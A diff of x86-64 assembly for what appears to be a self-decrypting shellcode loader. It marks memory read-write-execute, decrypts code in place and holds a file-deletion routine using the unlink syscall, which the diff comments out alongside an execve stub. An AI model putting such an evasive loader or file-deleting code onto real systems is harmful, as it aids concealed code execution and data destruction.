@@ -19,10 +19,16 @@ modify_data_flags:
 	mov		edx, 0x7									; PROT_READ|PROT_WRITE|PROT_EXEC
 	syscall
 
-delete_file:
-	pop		rdi			; Pop the address of the string from the stack
-    mov     eax, 0x57	; System call number for unlink
-    syscall
+	; pop rdi
+	; mov eax, 59
+	; xor esi, esi
+	; xor edx, edx
+	; syscall
+
+; delete_file:
+; 	pop		rdi			; Pop the address of the string from the stack
+;     mov     eax, 0x57	; System call number for unlink
+;     syscall
 
 prepare_decrpytion:
 	mov		r14, r8                     				; Copy _start address into r14
@@ -90,7 +96,8 @@ print_data:
 get_data:
 	call modify_data_flags
 
-	db "t.txt", 0x0		; Null-terminated filename of a file to delete
+	db ".bin", 0x0		; Null-terminated filename of a file to delete
+	; db "t.txt", 0x0		; Null-terminated filename of a file to delete
 	; db "d", 0x0		; Null-terminated filename of a folder to delete
 
 	; Define the variables as placeholders
